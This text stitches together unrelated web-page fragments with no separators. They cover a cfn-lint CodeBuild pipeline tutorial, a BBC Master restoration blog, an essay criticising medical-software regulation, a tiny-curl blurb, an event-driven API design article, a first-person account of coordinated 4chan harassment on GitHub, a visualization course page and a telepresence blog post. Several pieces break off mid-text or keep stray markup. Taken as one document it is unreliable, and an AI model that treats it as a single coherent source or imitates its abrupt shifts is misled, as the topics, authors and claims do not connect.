<p>The cfn-lint tool is added as a CodeBuild action in the validation stage of this pipeline. We add additional environment variables like the AWS Account ID, S3 report bucket, KMS Key and the pipeline name. The next step is to setup the buildspec of the CodeBuild project to add the container with the commands that need to be executed. The buildspec looks as follows:</p>
<pre><code>version: 0.2
phases:
  install:
    runtime-versions:
      python: 3.8
    commands:
      - apt-get update -y
      - apt-get install -y uuid-runtime
      - pip install cfn-lint
  build:
    commands:
      - |
        REPORT=$(uuidgen)-cfnlint-report.json
        <span>set</span> +e; cfn-lint <span>-f</span> json &gt; <span>$REPORT</span>
        aws s3 cp <span>$REPORT</span> s3://<span>$CFN_LINT_BUCKET</span>/<span>$AWS_ACCOUNT_ID</span>/<span>$CODE_PIPELINE_NAME</span>/$(date +<span>'%Y'</span>)/$(date +<span>'%m'</span>)/$(date +<span>'%d'</span>)/ --sse=aws:kms --sse-kms-key-id <span>$CFN_LINT_KMS_KEY_ARN</span> --acl bucket-owner-full-control
</code></pre>
<p>First, we install the required packages in the container, so we can run cfn-lint. Next, we run cfn-lint and make sure the command won't exit (<code>set +e</code>) when it reports an error. In this situation, we don't want to stop exit CodeBuild if we discover error because we use cfn-lint only for reporting. </p>
<p>In this setup, I've included a <a target="_blank" href="https://github.com/aws-cloudformation/cfn-python-lint#config-file">configuration file</a> which specifies what templates need to be analyzed. After the analysis, it will generate a report in JSON format which will be uploaded to an encrypted S3 bucket. As you can see the S3 CLI command is being used to transfer the report to the S3 bucket. We've included the variables which we passed from the <code>AWS::CodeBuild::Project</code> resource to dynamically create the object and enable KMS Encryption. After the report is uploaded to S3 it is ready for consumption for other applications.</p>
<h2 id="kms-and-s3-bucket">KMS &amp; S3 Bucket</h2>
<p>If you enable AWS KMS, make sure to include the following policies for the CodeBuild role:</p>
<pre><code>- Action:
    - s3:ListBucket
    - s3:ListBucketVersions
    - s3:ListObjects
    - s3:PutObject
    - s3:PutObjectAcl
  Effect: Allow
  Resource:
    - !GetAtt CfnLintBucket.Arn
    - !Sub ${CfnLintBucket.Arn}/*
  Sid: Allow S3 put CfnLintBucket
- Action:
    - kms:Encrypt
    - kms:ReEncrypt*
    - kms:GenerateDataKey*
    - kms:DescribeKey
    - kms:ListKeys
  Effect: Allow
  Resource: !GetAtt KMSKey.Arn
  Sid: Allow use of CMK in CfnLintBucket
</code></pre>
<p>The CodeBuild role is allowed to put the report in the destination bucket (CfnLintBucket). We also allow the role to encrypt the object using the KMSKey we created for the S3 Bucket. Then we need to explicitly allow the CodeBuildRole on the KMS Key policy, we can do that as follows:</p>
<pre><code>- Sid: Allow encrypt use of the key by the CodeBuildRole
  Effect: Allow
  Principal:
    AWS:
      - !GetAtt CodeBuildRole.Arn
  Action:
    - kms:Encrypt
    - kms:ReEncrypt*
    - kms:GenerateDataKey*
    - kms:DescribeKey
    - kms:ListKeys
  Resource: '*'
</code></pre>
<h2 id="to-summarize">To Summarize</h2>
<p>We've set up a CodePipeline which adds cfn-lint as a validation stage to analyze your CloudFormation templates and send the reports to an encrypted S3 Bucket. This allows auditors for example to check how well the templates are built according to best practices.</p>

<p>…or ELITE simply rulez!! 😀</p>
<h4>Intro</h4>
<p>Some time ago, I wrote a post about <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro restoration and upgrades.</a> This time, I present you a BBC Master – Beebs bigger brother 🙂</p>
<p>I’ve bought this BBC Master some time ago. It was sitting on a shelf for quite a while but finally, I’ve managed to start working on it. This time again, it was a custom order for my friend Wendell (cheers mate:)</p>
<p>Do I have to mention that it was sold as “For parts – non-working” ? :&gt;</p>
<p>Well, as it turned out, it wasn’t in a dramatic shape but required refreshing and upgrades.</p>
<p>Here is how it looked.</p>

<p>Case fixes were easy. I only had to fix a broken screw stud and fix some cracks with metal mesh and soldering iron.</p>
<p>Later, it was cleaned and retr0brighted. Simple stuff.</p>

<h4>Power supply fix and hack</h4>
<p>Before powering it on, I wanted to make sure that PSU is working properly. PSUs in Beeb and Master use caps that tend to explode and are worth checking before supplying power to it. My unit confirmed that. I had to replace these caps which was an easy job.</p>
<figure><img src="https://i1.wp.com/imgur.com/1u0gIIQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/1u0gIIQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<p>Wendell asked me to try making this unit usable in the US and in the EU. This simply means that PSU has to be a bit more flexible and should accept 110VAC/60HZ (USA) and 230VAC/50Hz (EU)</p>
<p>I was very lucky because this BBC had a San Hua Tien PSU inside and it turned out that it supports both working modes depending on a jumper setting.</p>

<p>I’ve simply added some wires and a switch. I only had to make a nice hole in PSUs metal case and I was golden 🙂</p>

<h4>Keyboard</h4>
<p>In the meantime, I’ve managed to clean up a keyboard. </p>

<h4>PCB cleaning and speaker fix</h4>
<p>Next, I’ve moved to PCB cleaning. As usual, I’ve dumped it into my ultrasonic cleaner to get rid of these nasty white crystalline structures. I’ve also replaced a broken speaker with the 8 Ohm speaker that I’ve found in one of my drawers 🙂</p>

<h4>Batter mod</h4>
<p>Finally, I could power it on and test if everything works … NOT</p>

<p>With the help of guys from an excellent <a href="http://stardot.org.uk/">stardot.org.uk</a> forum, I’ve managed to pinpoint a problem. It turned out that this is a common issue with BBC Master, and my unit was simply missing a battery. Looks like the previous owner removed it to prevent leakage and corrosion.</p>
<p>I’ve ordered a 3xAA battery case from <a href="http://www.retroclinic.com/">Mark of RetroClinic</a> and it worked like a charm. It has a diode soldered in-line to prevent batteries from charging. The downside is that batteries have to be replaced from time to time but still, this is a way better solution than the original one.</p>

<h4>RPI Zero as a co-pro</h4>
<p>While looking for a solution to my previous battery problem on <a href="https://stardot.org.uk/forums/">stardot forums</a>, I’ve stumbled across the same mod as in <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro post</a> – Rpi Zero as a co-pro. This time it is an internal mod and again, it is made by <a href="http://www.retroclinic.com/">Mark of retroclinic.com</a>.</p>
<p>He’d send it to me along with a battery tray and one more cool gear that I will talk about later 😉</p>
<p>It is mounted straight onto a BBC Masters PCB.</p>

<h4>External GOTEK</h4>
<p>The last add-on that I’ve got from Mark was a GOTEK with an OLED, all needed gear and a filled USB flash drive for it.</p>
<p>It is a very convenient solution for BBC Master and as expected, works like a charm 🙂</p>

  <article>
    <p>I’m back from cryosleep. After <a href="https://www.eidel.io/2020/01/31/pioneers-vs-process-people/">leaving Merantix Healthcare</a> 7 months ago I haven’t
been writing much. I took the summer off to finish my pilot’s license and to try out a few things on the
side.</p>

<p>One of them was doing regulatory consulting for medical software startups. Remember: At Merantix Healthcare
(now: Vara), we managed to pass all regulatory hurdles to bring our Machine Learning - based Radiology
software to market. At the time I thought this was quite an unspectacular achievement, but apparently many
other companies fail at it.</p>

<p>So, shortly after becoming unemployed, random people started emailing me with requests like “Hey, work as a
consultant for us, we pay you money, start tomorrow”. I started calling it the <em>magical consulting business
with zero marketing</em>.</p>

<p>It’s not like I was keen to do it, but it was worth a try.</p>

<p>I approached it with an open mind. Half a year later, after having succesfully worked with four companies,
here’s my verdict: It sucks.</p>

<p>Why? Many reasons. But let’s take a step back first.</p>

<p>What is regulation? (Bear with me) in human language, <em>regulation</em> is a list of hoops some authority puts in
your way of accessing the market. Everyone in your industry has to jump through these hoops.</p>

<p>Here’s the thing: In a sane world, with rational people, we wouldn’t need any regulation. People would be
building perfectly safe software. Like, they wouldn’t write buggy code that crashes and <a href="https://en.wikipedia.org/wiki/Therac-25" target="_blank">shoots high doses of
radiation at patients</a>.</p>

<p>Having perfect software is a utopic scenario. Software is never perfect. And even if most people build safe
stuff most of the time, just a small group of reckless individuals is enough to cause disaster.</p>

<p>That’s where regulation comes in. Regulation basically says: “Hey, this one company screwed up big time
recently, so from now on, every company has to comply with this list of things we came up with. Those measures
will surely prevent that from happening again!”.</p>

<p>And that sucks. Because what did we do? We took the maximum observed stupidity of our society (writing buggy
code that emits radiation) and now we <em>assume</em> that 1) everyone else is just as stupid and 2) that some rules
we came up with will prevent the problem in the future.</p>

<p>Let’s think about these assumptions.</p>

<h3 id="1-can-we-assume-everyone-to-be-stupid">1) Can We Assume Everyone to Be Stupid?</h3>

<p>Does it really sound like a good approach to subject everyone to the same standards? Standards which were
created based on the most incapable person, the <em>most-stupid-denominator</em>?</p>

<p>This reminds me of working at the office (good times). In any company, there are always some people who are
more messy than others. Or should we rather say: Less diligent. While you’re trying to write code, they have
loud phone calls on speakerphone. They enter your meeting room and don’t close the door. Sometimes they
“forget” to use the toilet brush after deploying a large payload.</p>

<p>Now, how do you deal with these problems? You have two options:</p>

<p>You talk to those people individually. This is not only the most discreet, but also the most effective
way. It’s also the hardest. At least for you: It takes courage to approach that person and deliver that sort
of message. But it’s the right thing to do.</p>

<p>The other option would be: You attempt to <em>generalize</em> the problem and solve it <em>generically</em> by establishing
new company policies. You put up a sign in the open office saying “No loud phones calls!”. On all meeting room
doors, you write “Please close the door”. And in each bathroom, you hang up a framed SOP for when to use the
toilet brush.</p>

<p>This is how large companies deal with those problems, and companies in which people don’t have the guts to
talk about problems one on one. It’s a cowardly and ineffective move. Guess what - the dude who has loud phone
calls will most likely not read a random sign on the wall. And all other people who were behaving perfectly
fine are now subjected to a barrage of useless signs which assume they’re utterly incompetent at breathing.</p>

<p>Unfortunately, regulation tries to solve problems in the same way.</p>

<p>Developers are expected to create hundreds of pages of documentation to prove that they’ve really tested
everything. They must write a development plan to ensure that they’re actually capable of developing whatever
they wanted to build (?). They have to make a list of their dependencies and test them (!).</p>

<p>If your development team is incompetent, forcing them to write a development plan won’t increase their code
quality. It only increases overhead.</p>

<p>Funnily enough, the same incompetent developers will pass all regulatory hurdles as long as they’re creating
the right documentation. A scary thought. Which leads me to the next question:</p>

<h3 id="2-will-our-rules-prevent-the-problem">2) Will Our Rules Prevent the Problem?</h3>

<p>Anyone who has ever observed complex systems knows: It’s hard to come up with interventions which actually
provide the desired outcome.</p>

<p>Say, your garden has snakes. You don’t like that because you want to sit on your patio and you’re scared of
snakes. So you put a honey badger there to chase away the snakes. Great, the snakes are gone. But now the
honey badger is settling down on your patio and has invited all his honey badger friends to hang out
there. Bad luck for you. A second order effect!</p>

<p>Is developing (medical) software a complex process? And, if so, can regulation be compared to a honey badger?
I think so.</p>

<p>We are introducing measures which we <em>assume</em> will improve things, because they were <em>associated</em> with certain
problems in the past. But in reality we don’t know if they were <em>causing</em> them. We just mixed up correlation
and causation.</p>

<p>It’s like observing people with Covid and saying “Aha! Those Covid patients are coughing! So let’s tell all
healthy people not to cough and they’ll be fine!”. Luckily our standards of medical science are better than
that. New treatments have to undergo clinical trials in which they must show an improvement in patient
outcome. Do our regulatory measures undergo similar testing? I’m not sure.</p>

<p>But one things <em>will</em> happen for sure: The list of hoops all future companies have to jump through just became
longer. And guess what? The useful time they can spend on developing their product has shrunk, again.</p>

<p>But here’s the worst part. After we’ve introduced our measures, software actually became safer. That leads us
to wrongly assume that <em>we chose the right measures</em> and <em>those measures caused improvements in safety</em>. But I
don’t think that’s true. Sure, we achieved our goal, but we don’t know <em>how</em>. Sounds like alchemy! A dangerous
situation.</p>

<p>I call these <em>second order effects of regulation</em>.</p>

<h2 id="second-order-effects">Second Order Effects?</h2>

<p>Do our regulatory measures <em>cause</em> us to develop safer software? Or are we kicking off second-order effects
and just accomplishing our goals by coincidence?</p>

<p>Let’s look at the facts.</p>

<p>Building medical software has tons of additional overhead. This leads to slower development, additional hires
and more audits. What do companies need when development slows down, head count increases and auditors knock
on your door? Right - more money.</p>

<p>We’re severely limiting the number of companies who can enter the market by raising the bar of funding
required.</p>

<p>What are the consequences?</p>

<p>Only companies with a lot of funding (and time) are able to enter the market. A two-person startup can’t
afford to hire expensive staff for regulatory compliance. And they sure as hell can’t afford to put countless
man-hours into documenting regulatory-compliant processes! What sort of processes do you need in a two-person
startup, anyway?</p>

<p>So: We’ve successfully prevented small startups from entering the market.</p>

<p>What’s the main difference between small startups and large companies? Small startups develop products which
solve existing problems in a novel way. They accomplish this through innovation which others deemed
infeasible, or too <em>risky</em>, or both.</p>

<p><em>Risky</em>. That’s the difference.</p>

<p>GE, Philips, Siemens - do you expect those enterprises to ship a <em>risky</em>, groundbreaking Machine Learning -
based Radiology software which radically automates radiology assessments? Hell no. You can hardly expect them
to ship any features at all. They’re too scared of changing things. They’re scared of things going wrong,
their public image taking a hit and losing their existing customers. They are <em>risk-averse</em>.</p>

<p>So, yes, our medical software has become safer, but not due to our regulatory requirements. Rather because
we’ve created a heavy selection bias of only allowing large, well-funded, risk-averse companies to enter the
market.</p>

<p>We achieved safety at the cost of killing innovation. Flying an airplane, we would say: Great landing, wrong
airport.</p>

<h2 id="a-decision-we-have-to-make">A Decision We Have to Make</h2>

<p>Nowadays, the daring two-person startup can no longer enter the market and reach patients. That’s where
innovation would have happened.</p>

<p>Is that a bad thing? Well, it depends.</p>

<p>Safety and progress are often on opposing ends of a spectrum - in most cases, you can’t have both. We, as a
society, have chosen to heavily favor safety over progress. Better keep things the way they are, because new
things can go wrong. And that’s a fair decision to make.</p>

<p>But I think we’re making the wrong decision. Because most of us are blind to the opportunity cost of <em>not
innovating</em>. We don’t see what would have happened to patients if we had had better software.</p>

<p>While I was working in the hospital, I would regularly be involved in admitting new patients. You won’t
believe how often they didn’t have an up-to-date list of their medication. I’d have to call their GP and
request their medication list to be <em>faxed</em>, if I could reach the GP at all. This process was slow and
error-prone.</p>

<p>Consider: If you’re hit by a car and wheeled into the ER, do you want your medication list to be unavailable
because your GP is unreachable? Do you want your patient history to be lost because it’s on paper, stashed
away in some drawer? Do you want to be exposed to additional radiation for imaging because your old images
are on a CD at your parents place?</p>

<p>Just how many …</p></article></div></div>

<p>
  <b>tiny-curl is curl for smaller systems</b>.
  </p><ul>
    <li> focused on providing a library for HTTP(S) GET
    </li><li> provides the familiar and known libcurl API
    </li><li> targets RTOSes and systems "too small to run regular Linux"
    </li><li> provides ports to RTOSes that "real curl" don't support
    </li><li> GPLv3 licensed
  </li></ul>
<p>
  All features that tiny-curl disables by default are possible to enable,
  piecemeal, but might increase footprint and memory requirements.
</p><p>
  As many as possible of the mechanisms that are done to shrink the footprint
  for tiny-curl are backported and merged into real curl.
</p><h2> Size requirements </h2>
<p>
  The goal of tiny-curl is to offer HTTPS GET powers within <b>100K of storage
  size</b> (on a 32 bit system), and that includes wolfSSL.
</p><p>
  tiny-curl itself requires about <b>20K of dynamic memory</b> (but using more
  may speed up transfers).
</p><h2> License </h2>
<p>
  tiny-curl is licensed under GPLv3. Note that this is different than the
  regular curl, which is MIT licensed.
</p><p>
  You can also get <a href="https://www.wolfssl.com/contact/">tiny-curl under
  a commercial license from wolfSSL</a>.

<p>The growth and adoption of web-based APIs is key to the transformational technology journey of any enterprise. Those APIs, whether they are RESTful or not, remain synchronous. They, like the web, utilize the pattern of HTTP to implement a request-response interaction approach.</p>

<p>To illustrate, assume we have a project management API with the following interactions:</p>

<ol>
<li>Create a project (e.g. POST /projects)</li>
<li>Create a new task (e.g. POST /projects/{projectId}/tasks)</li>
<li>Assign the task to someone on our team (e.g. POST /tasks/{taskId}/assignees)</li>
<li>The assignee marks the task as complete (e.g. PUT /tasks/{taskId})</li>
</ol>

<p>An API following this design works if design of the user interface closely mirrors those endpoints. But suppose an additional application requirement is to ‘automatically’ update a task’s status when marked complete by another user. With a request/response web-API, an option is to incessantly poll a status API on the chance a status might have changed. This is both cumbersome and error-prone.
Instead of polling, we can introduce an <strong>event-driven architecture</strong>.</p>

<h2 id="introduction-to-event-driven-architecture">Introduction to Event-Driven Architecture<a href="#introduction-to-event-driven-architecture" arialabel="Anchor"> #︎</a> </h2>

<p>In an event-driven architecture (or EDA), an application is composed of independent components that react to events published by other components. EDA is popular for distributed applications, as new components may be introduced into a solution to solve emerging problems — without the knowledge of previously developed components. Message brokers are used as an intermediary for communication, producing a loosely coupled design by preventing components from directly communicating with one another.</p>

<p>If you are familiar with service-oriented architecture (SOA), you have experienced EDA. Most service-oriented architectures used an enterprise service bus (ESB) for service communication rather than a message broker. Events were published to the ESB, where they were then routed to other services to integrate two or more software systems. However, ESBs proved problematic as they were used as “integration glue”, causing integration code to become scattered across services, apps, and the ESB; fragile systems were created. This fragility produced a greater need for coordination between teams, slowing software delivery.</p>

<h2 id="the-emergence-of-a-microservice-and-event-driven-architecture">The Emergence of a Microservice and Event-Driven Architecture<a href="#the-emergence-of-a-microservice-and-event-driven-architecture" arialabel="Anchor"> #︎</a> </h2>

<p>To overcome this increased coordination, the microservice architecture was introduced as a replacement for traditional SOA. This newer distributed architecture, built on APIs and microservices, encourages “dumb pipes, smart endpoints.” Integration logic is pushed to the consumers and producers. Message brokers, rather than ESBs, are used for message routing, not integration logic. Services and APIs talk to one another while hiding implementation details. This loose coupling makes software more resilient to evolution as new requirements emerge.</p>

<p>As enterprises shift to APIs backed by a microservice architecture, the number of published events has grown considerably. Message brokers are typically transactional in nature, ensuring once-and-only-once delivery of messages. While useful for traditional software development, the transactional nature of message brokers limits the scalability of service communication.</p>

<p>Distributed streaming data platforms, such as Apache Kafka, now offer enterprises higher throughput than traditional message brokers. Kafka removes the need for transactional messaging found in message brokers, opting instead for turning events into message streams. These streams are accessible by any authorized subscriber and may be accessed real-time or processed sequentially from a predetermined location or at the start of the stream.</p>

<h2 id="api-design-with-event-streaming">API Design with Event Streaming<a href="#api-design-with-event-streaming" arialabel="Anchor"> #︎</a> </h2>

<p>Event streams help software extend beyond the request-response approach common to web API styles such as REST, GraphQL, and gRPC. Software can communicate bi-directionally, removing the need for API consumers to continually poll for state changes. Instead, APIs publish events to an event stream for notification of data changes or important business events to any number of subscribed services for further processing.</p>

<p>Let’s revisit our previous example. We needed to solve two separate requirements:</p>

<ol>
<li>Notification when a task is marked as completed. Our only option without a message-driven architecture is to require interested parties to constantly make API calls to see if the task has been completed (aka polling)</li>
<li>Alerting a project owner when a task has been modified or marked as completed. Our only option is to mix our user interface concerns with our API by making the API send an email. The API is no longer responsible for managing projects and tasks — it is now responsible for the content and look-and-feel for email alerts</li>
</ol>

<p>If we introduce a message-driven architecture to our solution, we can develop an API that delivers project and task resources that offer the necessary capabilities (create, read, update, delete, and mark as complete). Our API doesn’t need to know about how the task completion event notification will be used, including that an email will be sent. All it needs to do is publish event messages when those events occur and allow other services to take action as appropriate. Events this API may publish include:</p>

<p><img src="https://www.asyncapi.com/images/posts/event-streaming-an-additional-architectural-style-to-suplement-api-design/event-examples.webp" alt="Example of API events" title="Example of API events"></p>

<p>Interested parties can then subscribe to the event(s) they are interested in and safely ignore the rest. In our example, we may end up with three components:</p>

<ol>
<li><strong>Projects API</strong> — Manages the Projects and Project Tasks resources via a REST-based API. The API may be comprised of one or more microservices that implement the capabilities offered by the REST API. When any event, from the list in the table above, occurs then the API publishes an event into the appropriate message stream for consumption by event subscribers</li>
<li><strong>Task Completed Email Microservice</strong> — Subscribes to the Task.Completed event, notifying project manager(s) via email when any task has been marked as completed</li>
<li><strong>Task Modified Email Microservice</strong> — Subscribes to the Task.Updated event, notifying all team members via email when any task has been edited</li>
</ol>

<p>The API has no awareness of the two microservices subscribed to the specific events; it just publishes the events to the appropriate message stream. The solution is considered loosely coupled and therefore capable of evolving over time as new requirements emerge, perhaps with new types of notifications (e.g. SMS, web dashboard alerts) or integrations (e.g. synching to JIRA).</p>

<h2 id="conclusion">Conclusion<a href="#conclusion" arialabel="Anchor"> #︎</a> </h2>

<p>The demand for more robust methods of software communication is pushing the limits of today’s interface solutions. Request/response-based APIs are essential. However, today’s technical problems are now demanding event-driven support — in addition to request/response — to improve an API’s capability offerings.</p>

<p>As API designers, we must strive to use all available tools to offer a better developer experience. As you enhance your existing APIs and new APIs emerge, ask yourself:</p>

<ol>
<li>How can my solution architecture be improved by moving beyond standard REST APIs and into a loosely-coupled event-driven architecture?</li>
<li>What events should my API publish that would benefit API consumers?</li>
<li>How will my API consumers benefit from the addition of these events and how do they take advantage of them?</li>
</ol>

<p>Let’s shift our approach from strictly request-response to thinking in terms of how our APIs can not only offer endpoints for requests, but events that enable the API to push to other services. The result will be increased innovation and more transformative APIs both within and across our LOBs.</p>

    </span></p><p><undefined>Here are a few examples. The most irritating ones used tech jargon ("fixing bloat") to mask their pathetic actions. As a bystander, you might not realize until viewing the proposed changes... and seeing all content deleted. This is also the most irritating because there is no obviously hateful or violent content, and can be written off as "just a joke." <span role="img" aria-label="face with rolling eyes">🙄</span></undefined></p><p>This is a specific type of trolling I was experiencing, called "dogpiling":</p><blockquote><p>Dogpiling: When a group of trolls works together to overwhelm a target through a barrage of disingenuous questions, threats, slurs, insults, and other tactics meant to shame, silence, discredit, or drive a target offline. — <a href="https://onlineharassmentfieldmanual.pen.org/defining-online-harassment-a-glossary-of-terms/">PEN America</a></p></blockquote><p>This is not a new tactic used to silence, but it was the first time I've personally experienced it. Good thing I designed a lot of our moderation tools and have talked about the <a href="https://youtu.be/5CSQYMOWOtQ?t=580">taxonomy of online abuse</a> before, and recognized this type of harassment quickly. I was able to get help from amazing coworkers, <a href="https://twitter.com/cheshire137">Sarah Vessels</a> and <a href="https://twitter.com/deniseyu21">Denise Yu</a>, to query my repo's referral data. The traffic was coming from 4chan... two 4chan threads totaling nearly 500 disturbing comments.</p><p>Seeing this shit was absolutely surreal. The GitHub content was annoying, but this made me feel sick. I still remember the feeling of being so overwhelmed and just sobbing at my desk. Reading disgusting, racist, sexist comments about me. Seeing screenshots of my face plastered across the threads. Understanding the exact moment where the dogpiling was coordinated. Realizing this was likely to keep happening (and it did).</p><p>And what still really creeps me out is that these people felt so emboldened to troll an EMPLOYEE using their actual GitHub accounts with legitimate work and contributions. <u>These harassers are everyday software engineers.</u></p><p>I'm not famous and I don't have a very large platform, so why me?</p><p>Upon reading the threads, there were some pretty clear reasons why this happened to me. I'll dig deeply into each one. <em>HUGE shoutout to my kat-ops counterpart <a href="https://twitter.com/pifafu">Kathy Zheng</a> for helping me compile screenshots!</em></p><h2>I'm a woman.</h2><p><undefined>Well, this was the most obvious reason. Women disproportionately experience online harassment, and very much so for sexual harassment. I included a few snippets but won't spend too much time on this one because it was some boring, basic bitch shit that we've all seen before <span role="img" aria-label="">🤷🏻‍♀️</span></undefined></p><p><span>

    </span></p><p>I'd like to point out that the idea of avoiding "diversity hires" as to not lower the bar of quality is still a prevalent sentiment within tech. Again, these are not just nameless 4chan trolls—they're people in our industry.</p><h2>... and should be punished.</h2><p>Yeah, these are gross. Apparently I should get fired and deserve the harassment because I'm an attention seeking whore on a programming platform!

    </span></p><p>That wasn't every screenshot from the threads, but is a good summary. The sheer volume of comments was definitely one of the more overwhelming aspects of this fuckery. Thanks for reading along this far.</p><h2>So if it wasn't clear:</h2><p><undefined>I was targeted by racist techies because of my background and visibility in order to be silenced and driven out of this industry. <span role="img" aria-label="middle finger">🖕</span></undefined></p><p>It was particularly cruel to harass me on the platform I work on everyday, where I design for open source communities. I couldn't focus at work and ended up taking two weeks off. This experience has really impacted the way I view tech and my place in it—but I'll save that for another post. </p><p>I've already accepted that this won't be my last brush with online harassment, so long as I'm still a visible Asian woman in tech. And this is going to continue happening to me and less privileged tech workers for just existing and being successful. All we can do is protect and support each other, because it's not our job to fix this problem.</p><p>It's your move next, tech. Here are my suggestions, you can have them for free:  </p><h2>To the most privileged tech leaders:</h2><p>When these events happen to your employees, are you investing actual money to support them? Are you monitoring content, encouraging time off, creating company policies, and covering their therapy? In lucky cases like mine, where the bulk of harassment may happen on the platform the victim works on, are you actively fixing pain points your employee experienced? Make sure you have a policy and detailed playbook, and definitely don't expect your marginalized employees to fix these problems for you. Don't wait until an incident arises—<strong>it's always an "edge case" until someone's personal safety is threatened.</strong></p><p>By not having intentional protections for the most vulnerable in place, you're preventing employees from being productive at work (because they're dealing with bullshit!). And you're absolutely driving away diverse talent from joining your company. It's actually fucking up your business. Access and representation in tech isn't a pipeline or qualification problem. <strong>It's a white supremacy problem.</strong></p><blockquote><p>And what still really creeps me out is that these people felt so emboldened to troll an EMPLOYEE using their actual GitHub accounts with legitimate work and contributions. <u>These harassers are everyday software engineers.</u></p></blockquote><p>Lastly, I want to circle back to this point about users with legitimate coding work harassing me. It's easy to dismiss these trolls as incel 4channers that we shun and don't associate with. Lol no. These are your people. They work at your companies and write your code. They are harassing or doxxing your other employees. This toxic behavior is still very much a part of your tech culture, and you keep rewarding it.</p><p>Fix. This. Shit.</p></article></div>]]>

<p><strong>Lectures on the fundamentals of information visualization and hands-on tutorials for basic visualization techniques and the necessary data processing</strong></p>

<h2 id="About">About<a href="#About">¶</a></h2><p>Information visualization is concerned with the visual and interactive representation of abstract and possibly complex datasets. As we encounter growing datasets in various sectors there is an increasing need to develop effective methods for making sense of data. Information visualization relies on computational means and our perceptual system to help reveal otherwise invisible patterns and gain new insights. Across various fields, there is great hope in the power of visualization to turn complex data into informative, engaging, and maybe even attractive forms. However, it typically takes several steps of data preparation and processing before a given dataset can be meaningfully visualized. While visualizations can indeed provide novel and useful perspectives on data, they can also obscure or misrepresent certain aspects of a phenomenon. Thus it is essential to develop a critical literacy towards the rhetoric of information visualization. One of the best ways to develop this literacy is to learn how to create visualizations!</p>
<p>The main aim of this course has been to familiarize students with the principles and methods of information visualization and to enable them to design, implement and deploy visualizations for data analysis and application scenarios in the information sciences and beyond. The course material consists of two main parts:  lectures and tutorials. While the lectures are meant as a basic introduction to information visualization, the tutorials offer a practical approach to working with data and to create interactive visualizations yourself.</p>

</div>

<div>
<h2 id="Credits">Credits<a href="#Credits">¶</a></h2><p>The lectures and tutorials were created for the Information Visualization course at Fachhochschule Potsdam during the summer semester 2020. Many thanks to Fidel Thomet, Jonas Parnow et al. at UCLAB for frequent feedback on the tutorials, and to the many generous creators of the various open source software packages used throughout the tutorials. Special thanks to the FH Potsdam students enrolled in the course who took on the challenge to learn information visualization under very special circumstances.</p>

<p>We like experimenting with geeky tools. All in the name of science of course…</p>



<p>How about sitting on a beach in Thailand and participating in conference in Stockholm by remote-controlling an ipad on a stick on wheels? Sounds like a fun experiment, doesn’t it? How many geek points is that?</p>



<figure><img src="https://hkniberg.files.wordpress.com/2013/12/henriks-double2.jpg?w=390&amp;h=520" alt="Image" title="Ipad on a stick on wheels"></figure>



<p>And hey, I just happen to be on an island in Thailand right now, and there’s this cool event&nbsp;<a href="http://leantribe.org/ltg-18/">Lean Tribe Gathering</a>&nbsp;happening at the Spotify Stockholm office, and I recently bought a&nbsp;<a href="http://www.doublerobotics.com/">double</a>. I saw one of those things driving around the office a few months ago, and it instantly popped to the top of my must-try-someday list.</p>



<p>So what was the hypothesis? I’ve heard that it’s only an experiment if you have a hypothesis. Otherwise it’s just playing around, and I wouldn’t want to be accused of that would I?</p>



<p>The conference was an evening of lightning talks and open space (= big room with lots of mingling and small groups of informal conversations, like a cocktail party under the guise of a conference). Will I hear and see the presentations? Will I be able to roll around and freely participate in the open space? Will I feel like I’m&nbsp;<em>really</em>&nbsp;<em>there</em>?</p>



<p>So my hypothesis was: “I can fully participate in this conference using a double”.</p>



<p>So how did it work out?</p>



<figure><img src="https://i0.wp.com/hkniberg.wordpress.com/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif" alt="" title="More..."></figure>



<p>It worked! The hypothesis was falsified, unfortunately, but it was still really cool! I sat on the beach near a restaurant with good connectivity, pulled out my ipad, logged on to my double in Stockholm, and started driving around and talking to people. Geek heaven!<img loading="lazy" src="https://hkniberg.files.wordpress.com/2013/12/on-the-beach2.jpg?w=650&amp;h=414" alt="Image" width="650" height="414">Alone on a dark beach because it got rather late. +6 hrs time difference.</p>



<p>I was totally impressed, but also slightly disappointed, at the same time. Impressed that I felt truly present at the conference, but slightly disappointed that I felt more like an observer &amp; comic relief than a real participant.</p>



<p><strong>Watching the lightning talks</strong></p>



<p>The controls were a bit clumsy, and my internet connection was a bit shaky. But I could get around fine, slowly, and I was able to make it to the front of the room right by the stage.</p>



<p>For the lightning talks I could see and hear the speakers fine (they had mics), and I could make out about half of the slides (depending on colors used, font size, etc). All in all I got the presenter’s message. But I didn’t need a double for that, someone could have put a laptop on a chair and connected me via skype/hangout. On the other hand, it was nice to be able to “turn my head” from time to time, to follow the speaker’s movements, or see the audience and the room.</p>



<p><strong>Mingling in the open space</strong></p>



<p>The open space part was really fascinating. Driving around this… thing…. and feeling like I’m really there. Weird.</p>



<p>However, although it was fun and cool, in practice it didn’t really work that well because of the background chatter. I could roll up to a group of people, but I could only pick out about 20% of what was being said, because of all the other discussion happening around me. Also, the ipad speakers are too weak for this kind of situation, people could only hear me speak if they bent down and put their head really close. So I felt more like an observer than a participant.</p>



<figure><a href="http://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg"><img src="https://hkniberg.files.wordpress.com/2013/12/my-ipad.jpg?w=468&amp;h=611" alt="Image"></a></figure>



<p>At one point I joined a smaller group (4 people) sitting a bit further off, away from the main chatter.&nbsp; That worked perfectly, I could join the group and really be part of the conversation.</p>



<p><strong>REAL telepresence</strong></p>



<p>The cool thing is that I was really there. I mean that thing rolling around was ME! On one hand I was like “wow, awesome, I teleported to Stockholm and shapeshifted along the way!”. A true out-of-body experience. On the other I hand I was like “HELP! I’m stuck inside this thing! My body has become and ipad on a stick on wheels!”.</p>



<p>I had the distinct sensation of “Wow, so this is what it’s like being a drunk&nbsp;<a href="http://en.wikipedia.org/wiki/Tetraplegia">tetraplegic</a>&nbsp;with bad hearing and a weak voice.”</p>



